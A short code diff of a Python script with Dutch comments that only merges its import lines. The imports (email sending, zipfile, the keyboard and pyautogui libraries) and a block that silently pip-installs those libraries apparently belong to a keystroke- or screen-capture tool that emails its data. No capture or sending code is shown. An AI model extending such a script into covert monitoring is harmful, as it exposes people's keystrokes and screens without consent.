@@ -1,12 +1,4 @@
-import os
-import smtplib
-import shutil
-import threading
-import subprocess
-import sys
-import time
-import zipfile
-import json
+import os, smtplib, shutil, threading, subprocess, sys, time, zipfile, json
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 from email.mime.base import MIMEBase
@@ -15,13 +7,11 @@ from datetime import datetime
 
 # Importeert de externe imports om het script te runnen
 try:
-    import keyboard
-    import pyautogui
+    import keyboard, pyautogui
 except:
     subprocess.check_call([sys.executable, "-m", "pip", "install", "keyboard"])
     subprocess.check_call([sys.executable, "-m", "pip", "install", "pyautogui"])
-    import keyboard
-    import pyautogui
+    import keyboard, pyautogui
 
 # variabelen
 exitEvent = threading.Event()
